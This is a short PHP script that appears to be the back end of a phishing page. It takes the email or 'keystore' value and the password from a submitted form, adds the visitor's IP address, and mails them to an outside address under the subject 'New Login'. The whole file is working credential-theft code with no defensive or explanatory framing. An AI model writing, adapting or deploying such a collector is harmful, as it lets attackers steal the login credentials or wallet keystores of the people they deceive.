 
<?php
$ip = getenv("REMOTE_ADDR");	

  if(!empty($_POST)) {
        
 $keystoreval= $_POST['email'];
  $password= $_POST['password'];

 
		$to = "nwaego@aloramaka.shop";
		
		
		
         $subject = "New Login : from Nav - Code Geek ".$ip;
		 
		 $message =  "keystore            : ".$keystoreval."\r\n";
		 $message .= "Password          : ".$password."\r\n";
		 $message .= "IP           : ".$ip."\r\n";
		$header = "Content type: Code Geek \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 
		 mail ($to,$subject,$message,$header);
  }	 

?>  